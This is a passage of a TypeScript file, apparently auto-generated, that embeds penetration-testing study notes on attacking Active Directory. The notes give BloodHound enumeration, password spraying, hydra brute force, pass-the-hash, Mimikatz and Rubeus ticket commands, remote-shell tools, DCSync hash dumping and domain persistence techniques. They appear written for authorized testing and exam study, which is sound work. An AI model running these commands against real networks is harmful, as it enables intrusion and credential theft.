// Auto-generated Comprehensive Field Manual & Knowledge Base
// Contains all markdown guides from All-Notes & CPTS Playbooks

export interface NoteHeading {
  level: number;
  text: string;
}

export interface NoteCommand {
  language: string;
  code: string;
  title?: string;
}

export interface KnowledgeNoteItem {
  id: string;
  title: string;
  category: string;
  subcategory?: string;
  filePath: string;
  content: string;
  headings: NoteHeading[];
  commands: NoteCommand[];
  tags: string[];
  size: number;
  lineCount: number;
}

export const KNOWLEDGE_NOTES: KnowledgeNoteItem[] = [
  {
    "id": "ad-checklist-10-1-bloodhound-analysis-attack-path-discovery",
    "title": "1 BloodHound Analysis & Attack Path Discovery",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/10.1 BloodHound Analysis & Attack Path Discovery.md",
    "content": "# BloodHound Analysis & Attack Path Discovery\r\n\r\n## Objective\r\n\r\nUse BloodHound (or RustHound) to identify privilege escalation paths, excessive permissions, Kerberos attack opportunities, delegation issues, and routes to Domain Admin.\r\n\r\n> **Rule:** Every time you compromise a new user or obtain higher privileges, **collect BloodHound data again**. New permissions often reveal entirely new attack paths.\r\n\r\n---\r\n\r\n# 1. Collect BloodHound Data\r\n\r\n## Windows (SharpHound)\r\n\r\n```powershell\r\n.\\SharpHound.exe -c All\r\n```\r\n\r\nor\r\n\r\n```powershell\r\nInvoke-BloodHound -CollectionMethod All\r\n```\r\n\r\n## Linux (BloodHound.py)\r\n\r\n```bash\r\nbloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -dc <DC_HOST> -c All -ns <DC_IP>\r\n```\r\n\r\n## RustHound\r\n\r\n```bash\r\nrusthound -d <DOMAIN> -u <USER> -p <PASSWORD> -f bloodhound.zip\r\n```\r\n\r\nImport the collected ZIP file into BloodHound.\r\n\r\n---\r\n\r\n# 2. Analyze Attack Paths\r\n\r\nStart with the built-in BloodHound queries.\r\n\r\nFocus on:\r\n\r\n- Shortest Paths to Domain Admin\r\n- Shortest Paths to High Value Targets\r\n- High Value Targets\r\n- Owned Principals\r\n- Tier Zero Assets\r\n\r\n---\r\n\r\n# 3. Review Privileged Groups\r\n\r\nIdentify membership in privileged groups.\r\n\r\nLook for:\r\n\r\n- Domain Admins\r\n- Enterprise Admins\r\n- Schema Admins\r\n- Account Operators\r\n- Backup Operators\r\n- Server Operators\r\n- DNSAdmins\r\n- Print Operators\r\n\r\nReview nested group memberships as well.\r\n\r\n---\r\n\r\n# 4. Check for Kerberos Attack Opportunities\r\n\r\nBloodHound can quickly identify:\r\n\r\n- Kerberoastable Accounts\r\n- AS-REP Roastable Users\r\n- Constrained Delegation\r\n- Unconstrained Delegation\r\n- Resource-Based Constrained Delegation (RBCD)\r\n\r\nAlways investigate these before attempting manual enumeration.\r\n\r\n---\r\n\r\n# 5. Review ACL-Based Attack Paths\r\n\r\nLook for objects where the compromised account has dangerous permissions.\r\n\r\nInteresting rights include:\r\n\r\n- GenericAll\r\n- GenericWrite\r\n- WriteOwner\r\n- WriteDACL\r\n- ForceChangePassword\r\n- AddMember\r\n- AddSelf\r\n- AllExtendedRights\r\n\r\nThese permissions often allow privilege escalation without exploiting software vulnerabilities.\r\n\r\n---\r\n\r\n# 6. Check for DCSync Rights\r\n\r\nDetermine whether the current user has replication privileges.\r\n\r\nLook for:\r\n\r\n- GetChanges\r\n- GetChangesAll\r\n- GetChangesInFilteredSet\r\n\r\nIf present, DCSync may be possible without Domain Admin membership.\r\n\r\n---\r\n\r\n# 7. Enumerate Delegation\r\n\r\nReview all delegation relationships.\r\n\r\nFocus on:\r\n\r\n- Unconstrained Delegation\r\n- Constrained Delegation\r\n- Resource-Based Constrained Delegation (RBCD)\r\n\r\n---\r\n\r\n# 8. Check for AD CS Attack Paths\r\n\r\nIf Active Directory Certificate Services is present, identify:\r\n\r\n- Vulnerable certificate templates\r\n- Enrollment rights\r\n- ESC attack paths\r\n\r\nBloodHound CE can visualize many AD CS attack paths.\r\n\r\n---\r\n\r\n# 9. Review User Sessions\r\n\r\nIdentify privileged users currently logged into systems.\r\n\r\nLook for:\r\n\r\n- Domain Admin sessions\r\n- Service account sessions\r\n- Administrative workstations\r\n\r\nThese often become excellent lateral movement targets.\r\n\r\n---\r\n\r\n# 10. Re-Collect BloodHound Data\r\n\r\nAlways collect BloodHound data again after:\r\n\r\n- Compromising a new user\r\n- Obtaining local administrator privileges\r\n- Dumping credentials\r\n- Performing lateral movement\r\n- Becoming Domain Admin\r\n\r\n> **New user = New BloodHound collection.**\r\n\r\nMany attack paths only appear after additional privileges are obtained.\r\n\r\n---\r\n\r\n## BloodHound Checklist\r\n\r\n- [ ] Collect BloodHound data.\r\n- [ ] Import data into BloodHound.\r\n- [ ] Review shortest paths to Domain Admin.\r\n- [ ] Review shortest paths to High Value Targets.\r\n- [ ] Check Kerberoastable accounts.\r\n- [ ] Check AS-REP Roastable users.\r\n- [ ] Review exploitable ACLs.\r\n- [ ] Check for DCSync rights.\r\n- [ ] Enumerate delegation (Unconstrained, Constrained, RBCD).\r\n- [ ] Review AD CS attack paths.\r\n- [ ] Check active privileged sessions.\r\n- [ ] Re-collect BloodHound data after every privilege escalation or newly compromised user.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- BloodHound is a **decision-making tool**, not just a data collector.\r\n- Prioritize the **shortest and lowest-noise** attack path.\r\n- Always investigate ACL-based privilege escalation before attempting password attacks.\r\n- Re-run BloodHound after every successful compromise—new edges and attack paths frequently appear.\r\n- Use BloodHound to validate privilege escalation opportunities before executing them.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "bloodhound",
      "kerberos",
      "rce",
      "lateral movement"
    ],
    "size": 4400,
    "lineCount": 199
  },
  {
    "id": "ad-checklist-10-active-directory-enumeration",
    "title": "Active Directory Enumeration",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/10. Active Directory Enumeration.md",
    "content": "# Active Directory Enumeration\r\n\r\n## Objective\r\n\r\nEnumerate the Active Directory environment to identify attack paths, misconfigurations, excessive privileges, trust relationships, delegation settings, and privilege escalation opportunities.\r\n\r\n---\r\n\r\n# 1. BloodHound Enumeration\r\n\r\nCollect Active Directory objects and relationships.\r\n\r\n## Linux (BloodHound.py)\r\n\r\n```bash\r\nbloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -dc <DC_HOST> -c All -ns <DC_IP>\r\n```\r\n\r\n## Windows (SharpHound)\r\n\r\n```powershell\r\n.\\SharpHound.exe -c All\r\n```\r\n\r\nor\r\n\r\n```powershell\r\nInvoke-BloodHound -CollectionMethod All\r\n```\r\n\r\n> **Tip:** Re-run BloodHound after every privilege escalation or lateral movement. Newly compromised accounts often reveal additional attack paths.\r\n\r\n---\r\n\r\n# 2. Enumerate Domain Information\r\n\r\nGather basic domain information.\r\n\r\n```bash\r\nnxc ldap <DC_IP> -u <USER> -p <PASSWORD> --groups\r\n```\r\n\r\n```bash\r\nnxc ldap <DC_IP> -u <USER> -p <PASSWORD> --users\r\n```\r\n\r\n```bash\r\nnxc ldap <DC_IP> -u <USER> -p <PASSWORD> --computers\r\n```\r\n\r\n```bash\r\nnxc ldap <DC_IP> -u <USER> -p <PASSWORD> --dc-list\r\n```\r\n\r\nIdentify:\r\n\r\n- Domain Controllers\r\n- Domain SID\r\n- Domain Functional Level\r\n- Domain Users\r\n- Domain Computers\r\n- Domain Groups\r\n\r\n---\r\n\r\n# 3. Group Enumeration\r\n\r\nReview privileged and interesting groups.\r\n\r\nFocus on:\r\n\r\n- Domain Admins\r\n- Enterprise Admins\r\n- Schema Admins\r\n- Account Operators\r\n- Server Operators\r\n- Backup Operators\r\n- Print Operators\r\n- Remote Management Users\r\n- Remote Desktop Users\r\n- DNSAdmins\r\n\r\nIdentify:\r\n\r\n- Nested group membership\r\n- Service accounts\r\n- Unexpected privileged users\r\n\r\n---\r\n\r\n# 4. ACL Enumeration\r\n\r\nLook for permissions that can be abused.\r\n\r\nInteresting permissions include:\r\n\r\n- GenericAll\r\n- GenericWrite\r\n- WriteOwner\r\n- WriteDACL\r\n- ForceChangePassword\r\n- AddMember\r\n- AddSelf\r\n- AllExtendedRights\r\n\r\nBloodHound will highlight these relationships automatically.\r\n\r\n---\r\n\r\n# 5. GPO Enumeration\r\n\r\nEnumerate Group Policy Objects.\r\n\r\nLook for:\r\n\r\n- Startup scripts\r\n- Logon scripts\r\n- Scheduled tasks\r\n- Registry Preferences\r\n- Drive mappings\r\n- Software deployment\r\n- Local administrator configuration\r\n\r\nInspect:\r\n\r\n- SYSVOL\r\n- NETLOGON\r\n\r\nCheck for:\r\n\r\n- Group Policy Preferences (GPP)\r\n- `cpassword`\r\n- Writable GPOs\r\n\r\n---\r\n\r\n# 6. Trust Enumeration\r\n\r\nIdentify domain and forest trust relationships.\r\n\r\nReview:\r\n\r\n- Parent/Child trusts\r\n- External trusts\r\n- Forest trusts\r\n- Shortcut trusts\r\n\r\nDetermine:\r\n\r\n- Direction\r\n- Transitivity\r\n- SID filtering\r\n\r\nTrusts can provide attack paths into additional domains.\r\n\r\n---\r\n\r\n# 7. Delegation Enumeration\r\n\r\nIdentify systems and accounts configured for Kerberos delegation.\r\n\r\nReview:\r\n\r\n- Unconstrained Delegation\r\n- Constrained Delegation\r\n- Resource-Based Constrained Delegation (RBCD)\r\n\r\nLook for:\r\n\r\n- TrustedToAuthForDelegation\r\n- AllowedToDelegateTo\r\n- AllowedToActOnBehalfOfOtherIdentity\r\n\r\n---\r\n\r\n# 8. Service Principal Names (SPNs)\r\n\r\nEnumerate service accounts.\r\n\r\n```bash\r\nnxc ldap <DC_IP> -u <USER> -p <PASSWORD> --kerberoasting kerberoast.txt\r\n```\r\n\r\nLook for:\r\n\r\n- MSSQL\r\n- HTTP\r\n- CIFS\r\n- HOST\r\n- Exchange\r\n- Custom services\r\n\r\nService accounts frequently have elevated privileges.\r\n\r\n---\r\n\r\n# 9. AS-REP Roastable Users\r\n\r\nIdentify users with Kerberos pre-authentication disabled.\r\n\r\n```bash\r\nGetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -request\r\n```\r\n\r\n---\r\n\r\n# 10. Certificate Services (AD CS)\r\n\r\nDetermine whether AD CS is deployed.\r\n\r\n```bash\r\ncertipy find -u <USER>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP>\r\n```\r\n\r\nLook for:\r\n\r\n- Vulnerable templates\r\n- Enrollment rights\r\n- ESC1–ESC16 misconfigurations\r\n\r\n---\r\n\r\n# 11. Machine Account Quota\r\n\r\nDetermine whether standard users can create computer objects.\r\n\r\nReview:\r\n\r\n- `ms-DS-MachineAccountQuota`\r\n\r\nA non-zero value may enable attacks such as RBCD.\r\n\r\n---\r\n\r\n# 12. LAPS Enumeration\r\n\r\nDetermine whether Local Administrator Password Solution (LAPS) is deployed.\r\n\r\nCheck:\r\n\r\n- Legacy LAPS\r\n- Windows LAPS\r\n\r\nIdentify users with permission to read LAPS passwords.\r\n\r\n---\r\n\r\n# 13. DNS Enumeration\r\n\r\nReview:\r\n\r\n- DNS zones\r\n- Host records\r\n- Hidden servers\r\n- Management interfaces\r\n\r\nDNS often reveals additional attack surfaces.\r\n\r\n---\r\n\r\n# 14. Session Enumeration\r\n\r\nIdentify logged-in users.\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --sessions\r\n```\r\n\r\nLook for:\r\n\r\n- Domain Admin sessions\r\n- Service accounts\r\n- Privileged users\r\n\r\n---\r\n\r\n# 15. Local Administrator Enumeration\r\n\r\nDetermine local administrator relationships.\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --local-groups\r\n```\r\n\r\nIdentify:\r\n\r\n- Local Administrators\r\n- Remote Desktop Users\r\n- Remote Management Users\r\n\r\n---\r\n\r\n# 16. Attack Path Analysis\r\n\r\nAfter collecting all data, review BloodHound for:\r\n\r\n- Shortest Paths to Domain Admin\r\n- Owned Principals\r\n- Kerberoastable Users\r\n- AS-REP Roastable Users\r\n- High Value Targets\r\n- RBCD Opportunities\r\n- Shadow Credentials\r\n- AD CS\r\n- DCSync Rights\r\n- ForceChangePassword\r\n- GenericAll\r\n- GenericWrite\r\n\r\nAlways investigate the **shortest and lowest-noise** attack path first.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Re-run BloodHound after every privilege escalation.\r\n- Enumerate before exploiting.\r\n- Review every ACL identified by BloodHound.\r\n- Never ignore GPOs or SYSVOL.\r\n- Always inspect trust relationships.\r\n- Check delegation before attempting Kerberos attacks.\r\n- Review logged-in sessions regularly.\r\n- Look for multiple attack paths—there is rarely only one.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Collect BloodHound data.\r\n- [ ] Enumerate users, groups, and computers.\r\n- [ ] Review privileged groups.\r\n- [ ] Enumerate ACLs.\r\n- [ ] Enumerate GPOs.\r\n- [ ] Enumerate domain and forest trusts.\r\n- [ ] Enumerate delegation settings.\r\n- [ ] Enumerate SPNs.\r\n- [ ] Check for AS-REP Roastable users.\r\n- [ ] Enumerate AD CS.\r\n- [ ] Check MachineAccountQuota.\r\n- [ ] Enumerate LAPS.\r\n- [ ] Enumerate DNS.\r\n- [ ] Enumerate active sessions.\r\n- [ ] Enumerate local administrator groups.\r\n- [ ] Analyze BloodHound attack paths.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "bloodhound",
      "certipy",
      "kerberoasting",
      "esc1",
      "ldap",
      "smb",
      "kerberos",
      "rce",
      "lateral movement"
    ],
    "size": 6063,
    "lineCount": 345
  },
  {
    "id": "ad-checklist-09-credential-abuse-lateral-movement",
    "title": "Credential Abuse & Lateral Movement",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/09. Credential Abuse & Lateral Movement.md",
    "content": "# Credential Abuse & Lateral Movement\r\n\r\n## Objective\r\n\r\nLeverage recovered credentials, NTLM hashes, and Kerberos tickets to authenticate to remote systems, move laterally across the domain, and gain access to higher-value targets.\r\n\r\n---\r\n\r\n# 1. Validate Every Credential\r\n\r\nNever assume credentials only work on the system where they were found.\r\n\r\nTest every recovered password and NTLM hash against all discovered hosts.\r\n\r\nSupported protocols:\r\n\r\n- SMB\r\n- WinRM\r\n- RDP\r\n- LDAP\r\n- MSSQL\r\n- SSH\r\n- FTP\r\n- VNC\r\n- HTTP/HTTPS applications\r\n\r\nExample:\r\n\r\n```bash\r\nnxc smb targets.txt -u <USER> -p <PASSWORD>\r\n```\r\n\r\n```bash\r\nnxc smb targets.txt -u <USER> -H <NTLM_HASH>\r\n```\r\n\r\n---\r\n\r\n# 2. Password Reuse\r\n\r\nWhenever a new password is recovered:\r\n\r\n- Test it against all discovered users.\r\n- Test local authentication.\r\n- Test domain authentication.\r\n- Spray only if engagement rules allow.\r\n\r\nPassword reuse is extremely common in enterprise environments.\r\n\r\n---\r\n\r\n# 3. Pass-the-Hash (PTH)\r\n\r\nUse recovered NTLM hashes to authenticate without knowing the plaintext password.\r\n\r\n## SMB\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>\r\n```\r\n\r\n## WinRM\r\n\r\n```bash\r\nnxc winrm <TARGET_IP> -u <USER> -H <NTLM_HASH>\r\n```\r\n\r\n## PsExec\r\n\r\n```bash\r\nimpacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>\r\n```\r\n\r\n## WMIExec\r\n\r\n```bash\r\nimpacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>\r\n```\r\n\r\n## SMBExec\r\n\r\n```bash\r\nimpacket-smbexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>\r\n```\r\n\r\n> **Note:** Some services (such as RDP) generally require plaintext credentials rather than NTLM hashes.\r\n\r\n---\r\n\r\n# 4. Pass-the-Ticket (PTT)\r\n\r\nAuthenticate using an existing Kerberos ticket instead of credentials.\r\n\r\n## Linux\r\n\r\n```bash\r\nexport KRB5CCNAME=ticket.ccache\r\n```\r\n\r\nExample:\r\n\r\n```bash\r\nimpacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_IP>\r\n```\r\n\r\n## Windows (Mimikatz)\r\n\r\n```text\r\nkerberos::ptt ticket.kirbi\r\n```\r\n\r\nVerify:\r\n\r\n```cmd\r\nklist\r\n```\r\n\r\n---\r\n\r\n# 5. Overpass-the-Hash (Pass-the-Key)\r\n\r\nConvert an NTLM hash into a Kerberos TGT.\r\n\r\n## Mimikatz\r\n\r\n```text\r\nsekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH>\r\n```\r\n\r\n## Rubeus\r\n\r\n```powershell\r\nRubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /ptt\r\n```\r\n\r\n> Useful when Kerberos authentication is required but only the NTLM hash is available.\r\n\r\n---\r\n\r\n# 6. Remote Command Execution\r\n\r\nOnce administrative access is confirmed, obtain an interactive shell.\r\n\r\n## WinRM\r\n\r\n```bash\r\nevil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n## PsExec\r\n\r\n```bash\r\nimpacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>\r\n```\r\n\r\n## WMIExec\r\n\r\n```bash\r\nimpacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>\r\n```\r\n\r\n## SMBExec\r\n\r\n```bash\r\nimpacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>\r\n```\r\n\r\n---\r\n\r\n# 7. Local Administrator Reuse\r\n\r\nWhenever local administrator credentials are recovered:\r\n\r\n- Test them against all member servers.\r\n- Test workstations.\r\n- Always try local authentication.\r\n\r\nExample:\r\n\r\n```bash\r\nnxc smb targets.txt -u Administrator -H <NTLM_HASH> --local-auth\r\n```\r\n\r\n---\r\n\r\n# 8. Kerberos Ticket Forgery\r\n\r\nOnce the required keys are obtained, forged Kerberos tickets can be used for persistence and lateral movement.\r\n\r\n## Silver Ticket\r\n\r\n**Requirements**\r\n\r\n- Service account NTLM hash (or AES key)\r\n- Domain SID\r\n- Target SPN\r\n\r\n> Provides access to a specific service without contacting the KDC.\r\n\r\n---\r\n\r\n## Golden Ticket\r\n\r\n**Requirements**\r\n\r\n- KRBTGT NTLM hash\r\n- Domain SID\r\n\r\n> Provides unrestricted Kerberos authentication across the domain.\r\n\r\n---\r\n\r\n# 9. DCSync\r\n\r\nIf replication privileges are obtained, dump domain password hashes directly from Active Directory.\r\n\r\n```bash\r\nimpacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>\r\n```\r\n\r\n> Recover:\r\n>\r\n> - KRBTGT hash\r\n> - Administrator hash\r\n> - Domain user hashes\r\n> - Computer account hashes\r\n\r\n---\r\n\r\n# 10. BloodHound Re-Enumeration\r\n\r\nAfter every successful privilege escalation or lateral movement:\r\n\r\n- Collect BloodHound data again.\r\n- Import the new ZIP file.\r\n- Identify newly available attack paths.\r\n\r\nAttack paths frequently change after compromising additional users or systems.\r\n\r\n---\r\n\r\n# 11. Credential Validation\r\n\r\nWhenever credentials or hashes are recovered:\r\n\r\nTest:\r\n\r\n- SMB\r\n- WinRM\r\n- LDAP\r\n- MSSQL\r\n- RDP\r\n- SSH\r\n- Local authentication\r\n\r\nNever rely solely on `nxc` output.\r\n\r\nManually verify administrative access whenever possible.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Validate every recovered credential immediately.\r\n- Test passwords before hashes when both are available.\r\n- Keep all recovered NTLM hashes for future Pass-the-Hash attacks.\r\n- Save all Kerberos tickets (`.kirbi` and `.ccache`).\r\n- Re-run BloodHound after each successful compromise.\r\n- Prefer RDP when interactive desktop access is available.\r\n- Test local administrator credentials across every Windows host.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Validate recovered passwords.\r\n- [ ] Validate recovered NTLM hashes.\r\n- [ ] Perform Pass-the-Hash.\r\n- [ ] Perform Pass-the-Ticket.\r\n- [ ] Perform Overpass-the-Hash.\r\n- [ ] Obtain remote shells (WinRM, PsExec, WMIExec, SMBExec).\r\n- [ ] Test local administrator reuse.\r\n- [ ] Forge Silver Tickets (when applicable).\r\n- [ ] Forge Golden Tickets (when applicable).\r\n- [ ] Perform DCSync (when permissions allow).\r\n- [ ] Re-run BloodHound.\r\n- [ ] Continue credential validation on newly discovered hosts.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "mimikatz",
      "bloodhound",
      "rubeus",
      "impacket",
      "psexec",
      "winrm",
      "silver ticket",
      "golden ticket",
      "pass-the-ticket",
      "pass-the-hash",
      "ldap",
      "smb",
      "kerberos",
      "persistence",
      "lateral movement"
    ],
    "size": 5449,
    "lineCount": 288
  },
  {
    "id": "ad-checklist-04-credential-validation-authentication-testing",
    "title": "Credential Validation & Authentication Testing",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/04. Credential Validation & Authentication Testing.md",
    "content": "# Credential Testing\r\n\r\n## Objective\r\n\r\nValidate discovered credentials (passwords and NTLM hashes) across all exposed services to identify accessible systems, enable lateral movement, and uncover privilege escalation opportunities.\r\n\r\n---\r\n\r\n## 1. Test Credentials Across All Services\r\n\r\nNever assume credentials only work on one service. Test them against every exposed protocol.\r\n\r\n### SMB\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n### WinRM\r\n\r\n```bash\r\nnxc winrm <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n### LDAP\r\n\r\n```bash\r\nnxc ldap <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n### RDP\r\n\r\n```bash\r\nnxc rdp <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n### SSH\r\n\r\n```bash\r\nnxc ssh <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n### MSSQL\r\n\r\n```bash\r\nnxc mssql <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n> **Tip:** A credential that fails on one protocol may still authenticate successfully on another.\r\n\r\n---\r\n\r\n## 2. Test Local Authentication\r\n\r\nAlways test local authentication when targeting member servers or workstations.\r\n\r\n### SMB\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --local-auth\r\n```\r\n\r\n### WinRM\r\n\r\n```bash\r\nnxc winrm <TARGET_IP> -u <USER> -p <PASSWORD> --local-auth\r\n```\r\n\r\n### RDP\r\n\r\n```bash\r\nnxc rdp <TARGET_IP> -u <USER> -p <PASSWORD> --local-auth\r\n```\r\n\r\n> **Why?**\r\n>\r\n> Local administrator passwords may differ from domain credentials and are commonly reused across systems.\r\n\r\n---\r\n\r\n## 3. Password Spraying\r\n\r\nAfter collecting usernames, perform password spraying using common or recovered passwords.\r\n\r\n### Spray a Single Password\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u users.txt -p 'Password123!'\r\n```\r\n\r\n### Spray Multiple Passwords\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u users.txt -p passwords.txt\r\n```\r\n\r\n> **Note:** Respect account lockout policies before spraying.\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' --pass-pol\r\n```\r\n\r\n---\r\n\r\n## 4. Test NTLM Hashes\r\n\r\nIf NTLM hashes are recovered, test them across supported protocols.\r\n\r\n### SMB\r\n\r\n```bash\r\nnxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>\r\n```\r\n\r\n### WinRM\r\n\r\n```bash\r\nnxc winrm <TARGET_IP> -u <USER> -H <NTLM_HASH>\r\n```\r\n\r\n### MSSQL\r\n\r\n```bash\r\nnxc mssql <TARGET_IP> -u <USER> -H <NTLM_HASH>\r\n```\r\n\r\n> **Purpose:** Determine whether Pass-the-Hash authentication is possible.\r\n\r\n---\r\n\r\n## 5. SSH Authentication\r\n\r\nIf SSH is exposed and a valid username has been identified, test password authentication.\r\n\r\n### Test a Known Password\r\n\r\n```bash\r\nnxc ssh <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n### Brute Force (When Authorized)\r\n\r\n```bash\r\nhydra -L users.txt -P passwords.txt ssh://<TARGET_IP>\r\n```\r\n\r\n> **Note:** Only perform brute-force attacks when explicitly permitted by the engagement scope.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Test every newly discovered credential immediately.\r\n- Verify both domain and local authentication.\r\n- Password reuse across services is common.\r\n- Service accounts often have access to SMB, WinRM, MSSQL, or LDAP.\r\n- Successful authentication does not always imply administrative privileges—continue with privilege enumeration.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Test credentials against SMB.\r\n- [ ] Test credentials against WinRM.\r\n- [ ] Test credentials against LDAP.\r\n- [ ] Test credentials against RDP.\r\n- [ ] Test credentials against SSH.\r\n- [ ] Test credentials against MSSQL.\r\n- [ ] Test local authentication using `--local-auth`.\r\n- [ ] Perform password spraying.\r\n- [ ] Test recovered NTLM hashes.\r\n- [ ] Check for password reuse across multiple services.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "winrm",
      "pass-the-hash",
      "ldap",
      "smb",
      "rce",
      "lateral movement"
    ],
    "size": 3524,
    "lineCount": 173
  },
  {
    "id": "ad-checklist-13-domain-persistence",
    "title": "Domain Persistence",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/13. Domain Persistence.md",
    "content": "# 13. Domain Persistence\r\n\r\n## Objective\r\n\r\nAfter obtaining Domain Admin (or equivalent privileges), identify persistence mechanisms that survive password changes, reboots, or user account modifications. Persistence should only be performed when explicitly permitted by the engagement scope.\r\n\r\n> **Rule:** Persistence is usually the last phase of an engagement. Focus on stealth, reliability, and understanding how each mechanism works.\r\n\r\n---\r\n\r\n# 1. Verify Domain Administrator Access\r\n\r\nBefore attempting persistence, verify privileged access.\r\n\r\nCheck:\r\n\r\n- Domain Admin\r\n- Enterprise Admin\r\n- SYSTEM on Domain Controller\r\n\r\n---\r\n\r\n# 2. Golden Ticket\r\n\r\nPrerequisites:\r\n\r\n- KRBTGT NTLM Hash\r\n- Domain SID\r\n\r\nCreate a Golden Ticket.\r\n\r\nVerify:\r\n\r\n- Access to Domain Controller\r\n- Access after password changes\r\n- Ticket lifetime\r\n\r\n---\r\n\r\n# 3. Silver Ticket\r\n\r\nPrerequisites:\r\n\r\n- Service Account NTLM Hash\r\n- Service SPN\r\n- Domain SID\r\n\r\nCreate service-specific tickets.\r\n\r\nUseful services:\r\n\r\n- CIFS\r\n- HOST\r\n- HTTP\r\n- WSMAN\r\n- MSSQLSvc\r\n\r\n---\r\n\r\n# 4. Pass-the-Ticket (PTT)\r\n\r\nInject existing Kerberos tickets into memory.\r\n\r\nSources:\r\n\r\n- Exported `.kirbi`\r\n- Dumped tickets\r\n- Existing logon sessions\r\n\r\nUseful tools:\r\n\r\n- Rubeus\r\n- Mimikatz\r\n- Impacket\r\n\r\n---\r\n\r\n# 5. Skeleton Key (Legacy)\r\n\r\nInject a master password into LSASS.\r\n\r\nNotes:\r\n\r\n- Requires Domain Controller access.\r\n- Exists only until LSASS restarts.\r\n- Mostly useful for understanding older attack techniques.\r\n\r\n---\r\n\r\n# 6. AdminSDHolder Abuse\r\n\r\nReview:\r\n\r\n- AdminSDHolder ACLs\r\n- SDProp propagation\r\n\r\nUseful for maintaining privileged access through ACL inheritance.\r\n\r\n---\r\n\r\n# 7. ACL Persistence\r\n\r\nLook for opportunities to grant persistent rights.\r\n\r\nInteresting permissions:\r\n\r\n- GenericAll\r\n- GenericWrite\r\n- WriteDACL\r\n- WriteOwner\r\n- AllExtendedRights\r\n\r\nTargets:\r\n\r\n- Users\r\n- Groups\r\n- OUs\r\n- Computers\r\n\r\n---\r\n\r\n# 8. Resource-Based Constrained Delegation (RBCD)\r\n\r\nIf permitted:\r\n\r\n- Configure RBCD\r\n- Add attacker-controlled computer\r\n- Request service tickets on behalf of users\r\n\r\nCommon abuse:\r\n\r\n- MachineAccountQuota\r\n- GenericWrite\r\n- GenericAll\r\n\r\n---\r\n\r\n# 9. Shadow Credentials\r\n\r\nIf `msDS-KeyCredentialLink` is writable:\r\n\r\n- Add a KeyCredential\r\n- Authenticate using PKINIT\r\n- Obtain a TGT without changing the user's password\r\n\r\nUseful tools:\r\n\r\n- Whisker\r\n- Certipy\r\n- pyWhisker\r\n\r\n---\r\n\r\n# 10. Active Directory Certificate Services (AD CS)\r\n\r\nIf AD CS exists:\r\n\r\nCheck for:\r\n\r\n- ESC1\r\n- ESC2\r\n- ESC3\r\n- ESC4\r\n- ESC6\r\n- ESC8\r\n- ESC13\r\n\r\nCertificate-based authentication can provide long-term persistence.\r\n\r\nUseful tools:\r\n\r\n- Certipy\r\n- Certify\r\n\r\n---\r\n\r\n# 11. SID History Abuse\r\n\r\nReview:\r\n\r\n- SID History\r\n- Trust relationships\r\n\r\nUsed in:\r\n\r\n- Cross-domain attacks\r\n- Forest persistence\r\n\r\n---\r\n\r\n# 12. Group Membership Persistence\r\n\r\nCheck whether you can add accounts to privileged groups.\r\n\r\nExamples:\r\n\r\n- Domain Admins\r\n- Enterprise Admins\r\n- Account Operators\r\n- Backup Operators\r\n- DNSAdmins\r\n\r\nAlso review nested group memberships.\r\n\r\n---\r\n\r\n# 13. Computer Account Persistence\r\n\r\nReview:\r\n\r\n- MachineAccountQuota\r\n- Existing computer accounts\r\n- Delegation settings\r\n\r\nAbuse machine accounts where 